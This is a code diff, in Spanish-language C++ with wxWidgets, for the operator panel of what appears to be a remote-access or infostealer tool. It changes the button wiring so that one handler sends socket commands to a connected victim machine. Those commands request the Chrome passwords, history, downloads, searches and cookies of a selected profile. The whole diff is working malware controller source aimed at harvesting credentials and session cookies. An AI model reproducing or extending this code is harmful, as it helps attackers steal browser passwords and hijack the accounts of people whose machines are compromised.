@@ -5,7 +5,7 @@
 extern Servidor* p_Servidor;
 
 wxBEGIN_EVENT_TABLE(panelInfoChrome, wxPanel)
-	EVT_BUTTON(EnumChromeInfoIDS::BTN_Profiles, panelInfoChrome::OnListaPerfiles)
+	EVT_BUTTON(wxID_ANY, panelInfoChrome::OnProcesarBoton)
 wxEND_EVENT_TABLE()
 
 panelInfoChrome::panelInfoChrome(wxWindow* pParent, SOCKET sck_socket)
@@ -14,11 +14,11 @@ panelInfoChrome::panelInfoChrome(wxWindow* pParent, SOCKET sck_socket)
 	this->sckSocket = sck_socket;
 
 	wxButton* btn_perfiles = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Lista de perfiles");
-	wxButton* btn_passwords = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Contraseñas");
-	wxButton* btn_historialn = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Historial");
-	wxButton* btn_historiald = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Descargas");
-	wxButton* btn_searcht = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Busquedas");
-	wxButton* btn_cookies = new wxButton(this, EnumChromeInfoIDS::BTN_Profiles, "Cookies");
+	wxButton* btn_passwords = new wxButton(this, EnumChromeInfoIDS::BTN_Passwords, "Contraseñas");
+	wxButton* btn_historialn = new wxButton(this, EnumChromeInfoIDS::BTN_HistorialN, "Historial");
+	wxButton* btn_historiald = new wxButton(this, EnumChromeInfoIDS::BTN_HistorialD, "Descargas");
+	wxButton* btn_searcht = new wxButton(this, EnumChromeInfoIDS::BTN_Busquedas, "Busquedas");
+	wxButton* btn_cookies = new wxButton(this, EnumChromeInfoIDS::BTN_Cookies, "Cookies");
 
 	this->m_CrearListCtrls();
 
@@ -56,9 +56,60 @@ panelInfoChrome::panelInfoChrome(wxWindow* pParent, SOCKET sck_socket)
 	this->SetSizer(main_sizer);
 }
 
-void panelInfoChrome::OnListaPerfiles(wxCommandEvent&) {
-	this->listCtrlUsers->DeleteAllItems();
-	p_Servidor->cChunkSend(this->sckSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, true, EnumComandos::INF_Chrome_Profiles);
+void panelInfoChrome::OnProcesarBoton(wxCommandEvent& event) {
+	int evento = event.GetId();
+	int iComando = EnumComandos::INF_Chrome_Profile_Data;
+	std::string strPaquete = "";
+	std::string strUserPath = this->GetSelectedUserPath();
+	
+	if (strUserPath != "") {
+		strPaquete = strUserPath;
+		strPaquete.append(1, CMD_DEL);
+	}
+	switch (evento) {
+		case EnumChromeInfoIDS::BTN_Profiles:
+			this->listCtrlUsers->DeleteAllItems();
+			iComando = EnumComandos::INF_Chrome_Profiles;
+			strPaquete = "  ";
+			break;
+		case EnumChromeInfoIDS::BTN_Passwords:
+			this->listCtrlPasswords->DeleteAllItems();
+			strPaquete.append(1, '1');
+			break;
+		case EnumChromeInfoIDS::BTN_HistorialN:
+			this->listCtrlHistorialN->DeleteAllItems();
+			strPaquete.append(1, '2');
+			break;
+		case EnumChromeInfoIDS::BTN_HistorialD:
+			this->listCtrlHistorialD->DeleteAllItems();
+			strPaquete.append(1, '3');
+			break;
+		case EnumChromeInfoIDS::BTN_Busquedas:
+			this->listCtrlSearchT->DeleteAllItems();
+			strPaquete.append(1, '4');
+			break;
+		case EnumChromeInfoIDS::BTN_Cookies:
+			this->listCtrlCookies->DeleteAllItems();
+			strPaquete.append(1, '5');
+			break;
+		default:
+			this->listCtrlUsers->DeleteAllItems();
+			strPaquete = "  ";
+			break;
+	}
+	
+	if (iComando != 0 && strPaquete.size() > 1) {
+		p_Servidor->cChunkSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true, iComando);
+	}	
+}
+
+std::string panelInfoChrome::GetSelectedUserPath() {
+	std::string strOut = "";
+	long item = this->listCtrlUsers->GetNextItem(-1, wxLIST_NEXT_ALL, wxLIST_STATE_SELECTED);
+	if (item != wxNOT_FOUND) {
+		strOut = this->listCtrlUsers->GetItemText(item, 0);
+	}
+	return strOut;
 }
 
 void panelInfoChrome::m_CrearListCtrls() {
@@ -154,4 +205,8 @@ void panelInfoChrome::m_AgregarDataPerfiles(const std::string& strBuffer) {
 			}
 		}
 	}
+}
+
+void panelInfoChrome::m_ProcesarInfoPerfil(const std::string& strBuffer) {
+	DEBUG_MSG(strBuffer);
 }
